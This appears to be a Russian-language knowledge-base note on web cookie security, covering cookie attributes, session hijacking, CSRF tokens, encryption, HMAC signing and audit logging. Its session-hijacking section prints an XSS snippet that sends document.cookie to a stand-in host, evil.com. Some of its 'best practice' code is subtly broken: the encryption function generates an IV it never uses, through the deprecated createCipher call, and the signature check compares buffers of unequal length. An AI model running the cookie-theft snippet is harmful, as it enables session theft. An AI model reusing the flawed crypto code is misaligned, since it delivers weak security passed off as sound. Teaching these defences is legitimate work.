---
aliases: [Cookie Security, Безопасность Cookie, Защита Cookie]
tags: [security, cookies, frontend, authentication]
---

# Безопасность-куки

## Обзор

Куки (cookies) - это небольшие фрагменты данных, которые веб-сервер отправляет веб-браузеру пользователя. Браузер может сохранить эти данные и отправлять обратно на сервер при последующих запросах к тому же домену. Куки широко используются для аутентификации, управления сессиями, отслеживания пользовательских предпочтений и других целей. Безопасность куки критически важна для защиты веб-приложений от различных типов атак.

## Типы куки

### 1. Сессионные куки

- Временные куки, которые удаляются при закрытии браузера
- Обычно используются для хранения идентификатора сессии
- Не имеют даты истечения (Expires или Max-Age)

### 2. Постоянные куки

- Хранятся на устройстве пользователя до даты истечения
- Используются для сохранения пользовательских настроек
- Имеют дату истечения (Expires или Max-Age)

### 3. HTTP-only куки

- Недоступны для JavaScript через document.cookie
- Защищают от XSS-атак, которые пытаются украсть куки
- Устанавливаются только сервером

### 4. Secure куки

- Передаются только по HTTPS-соединению
- Защищают от перехвата данных через небезопасные соединения
- Предотвращают атаки типа "man-in-the-middle"

## Уязвимости куки

### 1. Угон сессии (Session Hijacking)

Атакующий может получить доступ к идентификатору сессии, хранящемуся в куки, и использовать его для имитации подлинности пользователя.

```javascript
// Пример XSS-атаки для кражи куки
var img = document.createElement('img');
img.src = 'https://evil.com/steal?cookie=' + document.cookie;
document.body.appendChild(img);
```

> [!warning] Важно
> Всегда используйте флаги HttpOnly и Secure для куки, содержащих чувствительную информацию, особенно идентификаторы сессий.

### 2. Подделка межсайтового запроса (CSRF)

Атакующий может заставить пользователя выполнить нежелательные действия, используя его аутентифицированное состояние.

### 3. Перехват куки через незащищенные соединения

Если куки передаются по незащищенному HTTP-соединению, они могут быть перехвачены.

### 4. Атаки с использованием куки-бомбы

Злоумышленник может создать чрезмерно большие куки, чтобы вызвать проблемы с производительностью или сбои.

## Атрибуты безопасности куки

### 1. HttpOnly

Предотвращает доступ к куки из JavaScript, защищая от XSS-атак:

```
Set-Cookie: sessionId=abc123; HttpOnly
```

### 2. Secure

Обеспечивает передачу куки только по HTTPS:

```
Set-Cookie: sessionId=abc123; Secure; HttpOnly
```

### 3. SameSite

Предотвращает отправку куки в межсайтовых запросах:

```
# Запрет отправки куки в межсайтовых запросах
Set-Cookie: sessionId=abc123; Secure; HttpOnly; SameSite=Strict

# Разрешение отправки куки только в межсайтовых GET-запросах
Set-Cookie: sessionId=abc123; Secure; HttpOnly; SameSite=Lax

# Отправка куки во всех контекстах (не рекомендуется)
Set-Cookie: sessionId=abc123; Secure; HttpOnly; SameSite=None
```

### 4. Domain и Path

Определяют область действия куки:

```
Set-Cookie: sessionId=abc123; Domain=example.com; Path=/; Secure; HttpOnly
```

### 5. Expires и Max-Age

Определяют срок действия куки:

```
# Установка даты истечения
Set-Cookie: preference=dark; Expires=Wed, 09 Jun 2024 10:18:14 GMT

# Установка срока действия в секундах
Set-Cookie: preference=dark; Max-Age=3600
```

## Лучшие практики безопасности

### 1. Использование всех атрибутов безопасности

Устанавливайте все необходимые атрибуты безопасности для чувствительных куки:

```
Set-Cookie: sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Domain=example.com
```

### 2. Регулярное обновление куки сессии

Обновляйте идентификатор сессии периодически или при важных событиях:

```javascript
// Пример обновления сессии на сервере
app.post('/sensitive-action', (req, res) => {
    // Проверка подлинности пользователя
    if (authenticateUser(req)) {
        // Обновление идентификатора сессии
        req.sessionID = generateNewSessionID();
        // Установка нового куки сессии
        res.cookie('sessionId', req.sessionID, {
            httpOnly: true,
            secure: true,
            sameSite: 'strict',
            maxAge: 3600000 // 1 час
        });
        
        // Выполнение чувствительного действия
        performSensitiveAction(req);
    }
});
```

### 3. Ограничение срока действия

Устанавливайте разумные сроки действия для куки:

- Сессионные куки: 1-24 часа
- Куки с настройками: несколько месяцев
- Куки аутентификации: до 30 дней

### 4. Шифрование содержимого куки

Для чувствительных данных используйте шифрование:

```javascript
// Пример шифрования данных куки
const crypto = require('crypto');

function encryptCookieData(data, secretKey) {
    const algorithm = 'aes-256-cbc';
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipher(algorithm, secretKey);
    let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    // Возврат зашифрованных данных с IV
    return iv.toString('hex') + ':' + encrypted;
}

function decryptCookieData(encryptedData, secretKey) {
    const algorithm = 'aes-256-cbc';
    const parts = encryptedData.split(':');
    const iv = Buffer.from(parts[0], 'hex');
    const encrypted = parts[1];
    
    const decipher = crypto.createDecipher(algorithm, secretKey);
    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    
    return JSON.parse(decrypted);
}
```

### 5. Проверка целостности

Используйте HMAC для проверки целостности данных куки:

```javascript
// Пример проверки целостности куки
const crypto = require('crypto');

function signCookie(value, secret) {
    return value + '.' + crypto
        .createHmac('sha256', secret)
        .update(value)
        .digest('base64')
        .replace(/\=+$/, '');
}

function verifyCookie(signedValue, secret) {
    const expectedSig = signCookie(signedValue.split('.')[0], secret);
    return crypto.timingSafeEqual(
        Buffer.from(signedValue),
        Buffer.from(expectedSig)
    );
}
```

## Защита от CSRF

### 1. CSRF-токены

Используйте токены для защиты от CSRF-атак:

```javascript
// Пример генерации CSRF-токена
function generateCSRFToken(sessionId, secret) {
    return crypto
        .createHmac('sha256', secret)
        .update(sessionId + Date.now())
        .digest('hex');
}

// Установка токена в куки и передача клиенту
app.get('/form', (req, res) => {
    const csrfToken = generateCSRFToken(req.sessionID, process.env.CSRF_SECRET);
    res.cookie('csrfToken', csrfToken, {
        httpOnly: true,
        secure: true,
        sameSite: 'strict'
    });
    res.render('form', { csrfToken });
});

// Проверка токена при получении данных формы
app.post('/submit', (req, res) => {
    const { csrfToken } = req.body;
    const expectedToken = req.cookies.csrfToken;
    
    if (csrfToken !== expectedToken) {
        return res.status(403).send('Неверный CSRF-токен');
    }
    
    // Обработка формы
    processForm(req.body);
});
```

### 2. SameSite атрибут

Установка атрибута SameSite помогает предотвратить CSRF-атаки:

- `SameSite=Strict` - куки отправляются только в рамках одного сайта
- `SameSite=Lax` - куки отправляются в некоторых межсайтовых сценариях (GET-запросы)
- `SameSite=None` - куки отправляются во всех контекстах (требует Secure)

## Проверка подлинности куки

### 1. Серверная проверка

Всегда проверяйте подлинность куки на сервере:

```javascript
// Пример проверки куки сессии
function validateSessionCookie(sessionId) {
    // Проверка в базе данных или кэше
    return sessionStore.isValid(sessionId);
}

app.use((req, res, next) => {
    const sessionId = req.cookies.sessionId;
    
    if (sessionId && validateSessionCookie(sessionId)) {
        req.isAuthenticated = true;
        req.sessionID = sessionId;
    } else {
        req.isAuthenticated = false;
    }
    
    next();
});
```

### 2. Проверка на клиенте

Для дополнительной безопасности можно проверять куки и на клиенте:

```javascript
// Проверка наличия и валидности куки на клиенте
function isSessionValid() {
    const sessionId = getCookie('sessionId');
    if (!sessionId) {
        return false;
    }
    
    // Проверка формата идентификатора сессии
    const sessionIdPattern = /^[a-zA-Z0-9]{20,}$/;
    return sessionIdPattern.test(sessionId);
}

function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
}
```

## Управление куки в SPA

### 1. Хранение токенов аутентификации

В SPA рекомендуется использовать httpOnly куки для хранения токенов аутентификации:

```javascript
// Пример аутентификации в SPA
async function login(credentials) {
    const response = await fetch('/api/login', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(credentials),
        credentials: 'include' // Включает куки в запрос
    });
    
    if (response.ok) {
        // Проверка аутентификации через защищенный эндпоинт
        return await verifyAuth();
    }
    throw new Error('Аутентификация не удалась');
}

async function verifyAuth() {
    const response = await fetch('/api/auth/verify', {
        credentials: 'include'
    });
    return response.ok;
}
```

### 2. Обновление куки

Реализуйте механизм обновления куки при необходимости:

```javascript
// Проверка срока действия куки и обновление при необходимости
async function ensureValidSession() {
    try {
        const response = await fetch('/api/session/validate', {
            credentials: 'include'
        });
        
        if (!response.ok && response.status === 401) {
            // Сессия истекла, перенаправление на страницу входа
            window.location.href = '/login';
        }
    } catch (error) {
        console.error('Ошибка проверки сессии:', error);
    }
}
```

## Мониторинг и аудит

### 1. Логирование обращений к куки

Реализуйте логирование обращений к куки на сервере:

```javascript
// Middleware для логирования обращений к куки
app.use((req, res, next) => {
    const sessionId = req.cookies.sessionId;
    if (sessionId) {
        console.log(`Доступ к сессии: ${sessionId} на ${req.path}`);
        // Логирование в систему аудита
        auditLog.record({
            action: 'session_access',
            sessionId: sessionId,
            path: req.path,
            ip: req.ip,
            timestamp: new Date()
        });
    }
    next();
});
```

### 2. Обнаружение подозрительной активности

Отслеживайте подозрительную активность, связанную с куки:

- Необычное количество запросов с одного идентификатора сессии
- Запросы с разных IP-адресов с одного идентификатора сессии
- Попытки аутентификации с недействительными куки

## Заключение

Безопасность куки - критически важный аспект безопасности веб-приложений. Правильное использование атрибутов безопасности, шифрование чувствительных данных, защита от CSRF и регулярный аудит помогают предотвратить большинство атак, связанных с куки.

Следует помнить, что куки - это механизм хранения данных на стороне клиента, и все данные в них потенциально могут быть скомпрометированы. Поэтому важно использовать дополнительные меры безопасности, такие как серверная проверка подлинности и ограничение срока действия сессий.

## См. также

- [[CSRF-защита]]
- [[XSS-защита]]
- [[HTTP-Security-Headers]]
- [[Управление-сессиями-и-аутентификацией]]
- [[Безопасность-в-SPA]]